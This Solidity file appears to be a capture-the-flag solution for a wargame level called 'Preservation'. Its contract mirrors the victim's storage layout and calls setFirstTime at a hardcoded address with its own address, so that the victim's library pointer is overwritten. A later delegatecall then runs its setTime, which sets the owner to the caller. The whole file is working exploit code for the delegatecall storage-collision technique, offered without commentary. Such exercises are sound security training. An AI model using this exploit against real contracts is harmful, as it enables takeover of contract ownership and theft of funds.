// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IPreservation {
    function setFirstTime(uint256) external;
}

contract PreservationHack {
    uint256 whatEver;
    uint256 whoCare;
    address public owner;

    function setTimeZone1Library() public {
        IPreservation(0x7bDd153169154bF5f0ff5Edd269Cc3925B3619cf).setFirstTime(uint256(uint160(address(this))));
    }

    function setTime(uint256) public {
        owner = msg.sender;
    }
}
